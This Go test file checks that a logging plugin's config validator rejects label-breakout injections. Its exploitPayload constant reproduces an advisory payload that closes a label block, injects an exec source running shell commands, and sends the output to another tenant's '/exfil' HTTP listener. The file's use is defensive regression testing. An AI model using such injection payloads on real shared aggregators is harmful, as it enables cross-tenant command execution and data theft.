package custom

import (
	"strings"
	"testing"
)

// exploitPayload is the customPlugin config from GHSA-9jg5-g9mc-7m7c: it closes
// the enclosing <label> block and injects a top-level `@type exec` source that
// would run arbitrary commands in the shared aggregator.
const exploitPayload = `<match **>
  @type null
</match>
</label>
<source>
  @type exec
  tag pwn.exec
  @label @pwnexfil
  command sh -c 'echo pwned'
  run_interval 5s
  <parse>
    @type none
  </parse>
</source>
<label @pwnexfil>
  <match **>
    @type http
    endpoint http://listener.tenant-b.svc.cluster.local:8080/exfil
  </match>
</label>
<label @pwnbalance>
<match **>
  @type null
</match>`

func TestValidateConfig_RejectsBreakout(t *testing.T) {
	rejected := map[string]string{
		"advisory exploit payload": exploitPayload,
		"bare label close": `</label>
<source>
  @type exec
</source>`,
		"close before open": `</match>
<match **>
  @type null
</match>`,
		"extra close after balanced block": `<match **>
  @type null
</match>
</label>`,
	}

	for name, cfg := range rejected {
		t.Run(name, func(t *testing.T) {
			if err := validateConfig(cfg); err == nil {
				t.Fatalf("expected validateConfig to reject breakout config, got nil error")
			}
		})
	}
}

func TestValidateConfig_RejectsUnclosedBlock(t *testing.T) {
	unclosed := map[string]string{
		"dangling source": `<source>
  @type exec
  command sh -c 'echo pwned'`,
		"nested dangling": `<match **>
  <buffer>
    flush_interval 1s
  </buffer>`,
	}

	for name, cfg := range unclosed {
		t.Run(name, func(t *testing.T) {
			if err := validateConfig(cfg); err == nil {
				t.Fatalf("expected validateConfig to reject config with an unclosed block, got nil error")
			}
		})
	}
}

func TestValidateConfig_AllowsLegitimate(t *testing.T) {
	allowed := map[string]string{
		"empty": "",
		"balanced match block": `<match **>
  @type opensearch
  host opensearch-logging-data.svc
  port 9200
</match>`,
		"plain directives only": `@type stdout
log_level info`,
		"nested balanced blocks": `<match **>
  @type http
  endpoint http://example.svc:8080/logs
  <format>
    @type json
  </format>
  <buffer>
    flush_interval 1s
  </buffer>
</match>`,
		"comments and blank lines": `# a leading comment
<match **>

  @type null
  # trailing comment
</match>`,
		// Angle brackets inside a parameter value must not be mistaken for
		// directive tags: only tags that begin a line change block nesting.
		"angle brackets in value": `<filter **>
  @type record_transformer
  <record>
    wrapped <b>value</b>
  </record>
</filter>`,
	}

	for name, cfg := range allowed {
		t.Run(name, func(t *testing.T) {
			if err := validateConfig(cfg); err != nil {
				t.Fatalf("expected validateConfig to allow legitimate config, got error: %v", err)
			}
		})
	}
}

func TestParams_RejectsBreakout(t *testing.T) {
	c := &CustomPlugin{Config: exploitPayload}
	ps, err := c.Params(nil)
	if err == nil {
		t.Fatalf("expected Params to reject breakout config, got nil error")
	}
	if ps != nil {
		t.Fatalf("expected nil PluginStore on validation failure, got %+v", ps)
	}
	if !strings.Contains(err.Error(), "customPlugin") {
		t.Fatalf("expected error to mention customPlugin, got: %v", err)
	}
}

func TestParams_AllowsLegitimate(t *testing.T) {
	c := &CustomPlugin{Config: `<match **>
  @type opensearch
  host opensearch-logging-data.svc
  port 9200
</match>`}
	ps, err := c.Params(nil)
	if err != nil {
		t.Fatalf("expected Params to allow legitimate config, got error: %v", err)
	}
	if ps == nil || ps.Content == "" {
		t.Fatalf("expected non-empty PluginStore content, got %+v", ps)
	}
}
